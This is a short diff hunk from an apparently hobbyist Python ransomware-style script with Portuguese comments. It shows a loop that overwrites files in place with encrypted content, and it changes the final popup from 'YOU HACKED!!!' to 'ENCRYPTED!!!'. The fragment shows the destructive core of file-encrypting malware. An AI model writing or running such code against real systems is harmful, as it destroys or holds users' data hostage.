@@ -25,7 +25,7 @@ for file in files:
     with open(file, "wb") as arquivo: ##estrutura junto com o 'for' para abrir e escrever em todos os arquivos
         arquivo.write(conteudo_encrypted) ##escrever conteudos na var 'conteudo_encriypted' - que possui todos arquivos criptografados
         
-messagebox.showinfo("Carregando....","YOU HACKED!!!")  
+messagebox.showinfo("Carregando....","ENCRYPTED!!!")  
 
 
 
